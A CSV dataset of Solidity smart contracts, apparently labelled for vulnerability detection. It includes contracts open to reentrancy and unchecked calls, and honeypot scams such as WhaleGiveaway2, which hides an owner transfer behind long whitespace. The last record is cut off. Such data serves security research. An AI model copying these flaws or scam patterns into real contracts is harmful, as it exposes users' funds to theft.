_id,name,code,label
10011,0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f,"

pragma solidity ^0.4.19;



contract PERSONAL_BANK

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum = 1 ether;

    

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)revert();

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)revert();

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000100000000001000000
10012,0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e,"

pragma solidity ^0.4.21;



contract PoCGame

{

    

     

     

    modifier onlyOwner()

    {

        require(msg.sender == owner);

        _;

    }

    

   modifier isOpenToPublic()

    {

        require(openToPublic);

        _;

    }



    modifier onlyRealPeople()

    {

          require (msg.sender == tx.origin);

        _;

    }



    modifier  onlyPlayers()

    { 

        require (wagers[msg.sender] > 0); 

        _; 

    }

    

   

     

    event Wager(uint256 amount, address depositer);

    event Win(uint256 amount, address paidTo);

    event Lose(uint256 amount, address loser);

    event Donate(uint256 amount, address paidTo, address donator);

    event DifficultyChanged(uint256 currentDifficulty);

    event BetLimitChanged(uint256 currentBetLimit);



     

    address private whale;

    uint256 betLimit;

    uint difficulty;

    uint private randomSeed;

    address owner;

    mapping(address => uint256) timestamps;

    mapping(address => uint256) wagers;

    bool openToPublic;

    uint256 totalDonated;



     

    constructor(address whaleAddress, uint256 wagerLimit) 

    onlyRealPeople()

    public 

    {

        openToPublic = false;

        owner = msg.sender;

        whale = whaleAddress;

        totalDonated = 0;

        betLimit = wagerLimit;

        

    }





     

    function OpenToThePublic() 

    onlyOwner()

    public

    {

        openToPublic = true;

    }

    

     

    function AdjustBetAmounts(uint256 amount) 

    onlyOwner()

    public

    {

        betLimit = amount;

        

        emit BetLimitChanged(betLimit);

    }

    

      

    function AdjustDifficulty(uint256 amount) 

    onlyOwner()

    public

    {

        difficulty = amount;

        

        emit DifficultyChanged(difficulty);

    }

    

    

    function() public payable { }



     

    function wager()

    isOpenToPublic()

    onlyRealPeople() 

    payable

    public 

    {

         
        require(msg.value == betLimit);

        

         
        require(wagers[msg.sender] == 0);



         
        timestamps[msg.sender] = block.number;

        wagers[msg.sender] = msg.value;

        emit Wager(msg.value, msg.sender);

    }

    

     

    function play()

    isOpenToPublic()

    onlyRealPeople()

    onlyPlayers()

    public

    {

        uint256 blockNumber = timestamps[msg.sender];

        if(blockNumber < block.number)

        {

            timestamps[msg.sender] = 0;

            wagers[msg.sender] = 0;

    

            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;

    

            if(winningNumber == difficulty / 2)

            {

                payout(msg.sender);

            }

            else 

            {

                 
                loseWager(betLimit / 2);

            }    

        }

        else

        {

            revert();

        }

    }



     

    function donate()

    isOpenToPublic()

    public 

    payable

    {

        donateToWhale(msg.value);

    }



     

    function payout(address winner) 

    internal 

    {

        uint256 ethToTransfer = address(this).balance / 2;

        

        winner.transfer(ethToTransfer);

        emit Win(ethToTransfer, winner);

    }



     

    function donateToWhale(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Donate(amount, whale, msg.sender);

    }



     

    function loseWager(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Lose(amount, msg.sender);

    }

    



     

    function ethBalance() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance;

    }

    

    

     

    function currentDifficulty() 

    public 

    view 

    returns (uint256)

    {

        return difficulty;

    }

    

    

     

    function currentBetLimit() 

    public 

    view 

    returns (uint256)

    {

        return betLimit;

    }

    

    function hasPlayerWagered(address player)

    public 

    view 

    returns (bool)

    {

        if(wagers[player] > 0)

        {

            return true;

        }

        else

        {

            return false;

        }

        

    }



     

    function winnersPot() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance / 2;

    }



     

    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) 

    public 

    onlyOwner() 

    returns (bool success) 

    {

        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);

    }

}



 
contract ERC20Interface 

{

    function transfer(address to, uint256 tokens) public returns (bool success);

}",0000000000000000001000000
10013,0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9,"

pragma solidity ^0.4.10;



contract Caller {

    function callAddress(address a) {

         
        a.call();

    }

}",0001000000000000000000000
10014,0x19cf8481ea15427a98ba3cdd6d9e14690011ab10,"

pragma solidity ^0.4.11;

interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }





 
contract MigrationAgent {

    function migrateFrom(address _from, uint256 _value);

}



contract ERC20 {

  uint public totalSupply;

  function balanceOf(address who) constant returns (uint);

  function allowance(address owner, address spender) constant returns (uint);



  function transfer(address to, uint value) returns (bool ok);

  function transferFrom(address from, address to, uint value) returns (bool ok);

  function approve(address spender, uint value) returns (bool ok);

  event Transfer(address indexed from, address indexed to, uint value);

  event Approval(address indexed owner, address indexed spender, uint value);

}







 

contract SafeMath {

  function safeMul(uint a, uint b) internal returns (uint) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeDiv(uint a, uint b) internal returns (uint) {

    assert(b > 0);

    uint c = a / b;

    assert(a == b * c + a % b);

    return c;

  }



  function safeSub(uint a, uint b) internal returns (uint) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint a, uint b) internal returns (uint) {

    uint c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  function max64(uint64 a, uint64 b) internal constant returns (uint64) {

    return a >= b ? a : b;

  }



  function min64(uint64 a, uint64 b) internal constant returns (uint64) {

    return a < b ? a : b;

  }



  function max256(uint256 a, uint256 b) internal constant returns (uint256) {

    return a >= b ? a : b;

  }



  function min256(uint256 a, uint256 b) internal constant returns (uint256) {

    return a < b ? a : b;

  }



  function assert(bool assertion) internal {

    if (!assertion) {

      throw;

    }

  }

}







 

contract StandardToken is ERC20, SafeMath {



   

  event Minted(address receiver, uint amount);



   

  mapping(address => uint) balances;

   
  mapping(address => uint) balancesRAW;

   

  mapping (address => mapping (address => uint)) allowed;



   

  function isToken() public constant returns (bool weAre) {

    return true;

  }



  function transfer(address _to, uint _value) returns (bool success) {

    balances[msg.sender] = safeSub(balances[msg.sender], _value);

    balances[_to] = safeAdd(balances[_to], _value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  function transferFrom(address _from, address _to, uint _value) returns (bool success) {

    uint _allowance = allowed[_from][msg.sender];



    balances[_to] = safeAdd(balances[_to], _value);

    balances[_from] = safeSub(balances[_from], _value);

    allowed[_from][msg.sender] = safeSub(_allowance, _value);

    Transfer(_from, _to, _value);

    return true;

  }



  function balanceOf(address _owner) constant returns (uint balance) {

    return balances[_owner];

  }



  function approve(address _spender, uint _value) returns (bool success) {



     
     
     
     
    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;



    allowed[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);

    return true;

  }



  function allowance(address _owner, address _spender) constant returns (uint remaining) {

    return allowed[_owner][_spender];

  }



  

  

}





 
contract daoPOLSKAtokens{



    string public name = ""DAO POLSKA TOKEN version 1"";

    string public symbol = ""DPL"";

    uint8 public constant decimals = 18;   


     
    address public owner;

    address public migrationMaster;	

     


    uint256 public otherchainstotalsupply =1.0 ether;

    uint256 public supplylimit      = 10000.0 ether;

	 
   uint256 public  totalSupply      = 0.0 ether;

	 
	address public Chain1 = 0x0;

	address public Chain2 = 0x0;

	address public Chain3 = 0x0;

	address public Chain4 = 0x0;



	address public migrationAgent=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;

    uint256 public totalMigrated;





    event Migrate(address indexed _from, address indexed _to, uint256 _value);

    event Refund(address indexed _from, uint256 _value);



	

	struct sendTokenAway{

		StandardToken coinContract;

		uint amount;

		address recipient;

	}

	mapping(uint => sendTokenAway) transfers;

	uint numTransfers=0;

	

  mapping (address => uint256) balances;

mapping (address => uint256) balancesRAW;

  mapping (address => mapping (address => uint256)) allowed;



	event UpdatedTokenInformation(string newName, string newSymbol);	

 

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

	event receivedEther(address indexed _from,uint256 _value);

  event Approval(address indexed _owner, address indexed _spender, uint256 _value);



       
    event Burn(address indexed from, uint256 value);

   
  bool public supplylimitset = false;

  bool public otherchainstotalset = false;

   

  function daoPOLSKAtokens() {

owner=msg.sender;

migrationMaster=msg.sender;

}



function  setSupply(uint256 supplyLOCKER) public {

    	   if (msg.sender != owner) {

      throw;

    }

		    	   if (supplylimitset != false) {

      throw;

    }

	supplylimitset = true;

  

	supplylimit = supplyLOCKER ** uint256(decimals);

 
  } 

function setotherchainstotalsupply(uint256 supplyLOCKER) public {

    	   if (msg.sender != owner) {

      throw;

    }

	    	   if (supplylimitset != false) {

      throw;

    }



	otherchainstotalset = true;

	otherchainstotalsupply = supplyLOCKER ** uint256(decimals);

	

  } 

     

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }



     

    function burn(uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);    
        balances[msg.sender] -= _value;             
        totalSupply -= _value;                       
        Burn(msg.sender, _value);

        return true;

    }



     

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balances[_from] >= _value);                 
        require(_value <= allowed[_from][msg.sender]);     
        balances[_from] -= _value;                          
        allowed[_from][msg.sender] -= _value;              
        totalSupply -= _value;                               
        Burn(_from, _value);

        return true;

    }

  

  function transfer(address _to, uint256 _value) returns (bool success) {

     
     
     
    if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

     
      balances[msg.sender] -= _value;

      balances[_to] += _value;

      Transfer(msg.sender, _to, _value);

      return true;

    } else { return false; }

  }



  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

     
    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

     
      balances[_to] += _value;

      balances[_from] -= _value;

      allowed[_from][msg.sender] -= _value;

      Transfer(_from, _to, _value);

      return true;

    } else { return false; }

  }



  function balanceOf(address _owner) constant returns (uint256 balance) {

    return balances[_owner];

  }



  function approve(address _spender, uint256 _value) returns (bool success) {

    allowed[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);

    return true;

  }



  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

    return allowed[_owner][_spender];

  }





	

	    function () payable  public {

		 if(funding){ 

        receivedEther(msg.sender, msg.value);

		balances[msg.sender]=balances[msg.sender]+msg.value;

		} else throw;

		

    }

   







	

  function setTokenInformation(string _name, string _symbol) {

    

	   if (msg.sender != owner) {

      throw;

    }

	name = _name;

    symbol = _symbol;



    UpdatedTokenInformation(name, symbol);

  }



function setChainsAddresses(address chainAd, int chainnumber) {

    

	   if (msg.sender != owner) {

      throw;

    }

	if(chainnumber==1){Chain1=chainAd;}

	if(chainnumber==2){Chain2=chainAd;}

	if(chainnumber==3){Chain3=chainAd;}

	if(chainnumber==4){Chain4=chainAd;}		

  } 



  function DAOPolskaTokenICOregulations() external returns(string wow) {

	return 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';

}

 




	function sendTokenAw(address StandardTokenAddress, address receiver, uint amount){

		if (msg.sender != owner) {

		throw;

		}

		sendTokenAway t = transfers[numTransfers];

		t.coinContract = StandardToken(StandardTokenAddress);

		t.amount = amount;

		t.recipient = receiver;

		t.coinContract.transfer(receiver, amount);

		numTransfers++;

	}



      
uint public tokenCreationRate=1000;

uint public bonusCreationRate=1000;

uint public CreationRate=1761;

   uint256 public constant oneweek = 36000;

uint256 public fundingEndBlock = 5433616;

bool public funding = true;

bool public refundstate = false;

bool public migratestate= false;

        function createDaoPOLSKAtokens(address holder) payable {



        if (!funding) throw;



         
        if (msg.value == 0) throw;

		 
        if (msg.value > (supplylimit - totalSupply) / CreationRate)

          throw;

		

		 
 
 






	 var numTokensRAW = msg.value;



        var numTokens = msg.value * CreationRate;

        totalSupply += numTokens;



         
        balances[holder] += numTokens;

        balancesRAW[holder] += numTokensRAW;

         
        Transfer(0, holder, numTokens);

		

		 
        uint256 percentOfTotal = 12;

        uint256 additionalTokens = 	numTokens * percentOfTotal / (100);



        totalSupply += additionalTokens;



        balances[migrationMaster] += additionalTokens;

        Transfer(0, migrationMaster, additionalTokens);

	

	}

	function setBonusCreationRate(uint newRate){

	if(msg.sender == owner) {

	bonusCreationRate=newRate;

	CreationRate=tokenCreationRate+bonusCreationRate;

	}

	}



    function FundsTransfer() external {

	if(funding==true) throw;

		 	if (!owner.send(this.balance)) throw;

    }

	

    function PartialFundsTransfer(uint SubX) external {

	      if (msg.sender != owner) throw;

         
        owner.send(this.balance - SubX);

	}

	function turnrefund() external {

	      if (msg.sender != owner) throw;

	refundstate=!refundstate;

        }

		

			function fundingState() external {

	      if (msg.sender != owner) throw;

	funding=!funding;

        }

    function turnmigrate() external {

	      if (msg.sender != migrationMaster) throw;

	migratestate=!migratestate;

}



     
	

function finalize() external {

        if (block.number <= fundingEndBlock+8*oneweek) throw;

         
        funding = false;	

		refundstate=!refundstate;

         
        if (msg.sender==owner)

         
		owner.send(this.balance);

    }

    function migrate(uint256 _value) external {

         
        if (migratestate) throw;





         
        if (_value == 0) throw;

        if (_value > balances[msg.sender]) throw;



        balances[msg.sender] -= _value;

        totalSupply -= _value;

        totalMigrated += _value;

        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);

        Migrate(msg.sender, migrationAgent, _value);

    }

	

function refundTRA() external {

         
        if (funding) throw;

        if (!refundstate) throw;



        var DAOPLTokenValue = balances[msg.sender];

        var ETHValue = balancesRAW[msg.sender];

        if (ETHValue == 0) throw;

        balancesRAW[msg.sender] = 0;

        totalSupply -= DAOPLTokenValue;

         

        Refund(msg.sender, ETHValue);

        msg.sender.transfer(ETHValue);

}



function preICOregulations() external returns(string wow) {

	return 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';

}





}





 ",0000000100000000001010100
10015,0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4,"

pragma solidity ^0.4.19;



contract PrivateBank

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function PrivateBank(address _log)

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value >= MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    {

        if(_am<=balances[msg.sender])

        {            

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10016,0x2972d548497286d18e92b5fa1f8f9139e5653fd2," 



pragma solidity ^0.4.0; 

contract demo{

    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

              
            caddress.call(id,from,_tos[i],v[i]);

        }

        return true;

    }

}",0100000000000000000001000
10017,0x39cfd754c85023648bf003bea2dd498c5612abfa,"

pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

 

}",0000000000010000000010000
10018,0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01,"



pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

    function Bal() public constant returns(uint){return this.balance;}

}",0000000000010000000010000
10019,0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859,"

 pragma solidity ^0.4.18;



contract MultiplicatorX4

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function withdraw()

    payable

    public

    {

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

    

    function multiplicate(address adr)

    public

    payable

    {

        if(msg.value>=this.balance)

        {        

            adr.transfer(this.balance+msg.value);

        }

    }

}",0000000000000000000000000
10020,0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2,"

pragma solidity ^0.4.19;



contract WhaleGiveaway2

{

    address public Owner = msg.sender;

    uint constant public minEligibility = 0.999001 ether; 

   

    function()

    public

    payable

    {

        

    }

   

    function redeem()

    public

    payable

    {                                                                    

        if(msg.value>=minEligibility)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
